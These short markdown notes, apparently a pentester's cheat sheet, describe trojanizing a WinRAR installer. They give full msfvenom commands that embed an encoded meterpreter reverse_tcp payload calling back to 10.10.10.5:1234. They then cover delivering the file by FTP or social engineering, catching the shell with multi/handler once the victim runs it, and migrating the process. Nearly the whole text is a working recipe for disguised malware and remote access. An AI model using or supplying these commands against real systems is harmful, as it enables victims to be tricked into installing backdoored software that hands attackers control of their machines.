#### Injecting payloads into windows portable executables
- Download winrar file
- msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -x ~/Downloads/wrar602.exe > ~/Desktop/Windows_Payloads/winrar.exe [this will inject the payload into wrar602 executables file ]
#### Transfer the file
- use ftp server or social engineering technique to upload the file into attacker machine.
- set up multi/handler module into metasploit to get meterpreter shell carefully set everyting that match with paylods.
- run click to run the file[ done by victim]
- this will give meterpreter shell
#### post-exploit
- after getting meterpreter shell
- run post/windows/manage/migrate [ this will migrate the process]

#### k options
- msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -k -x ~/Downloads/wrar602.exe > ~/Desktop/Windows_Payloads/winrar.exe [the k flag maintain everyting same as the winrar functionality but this k options always get error]
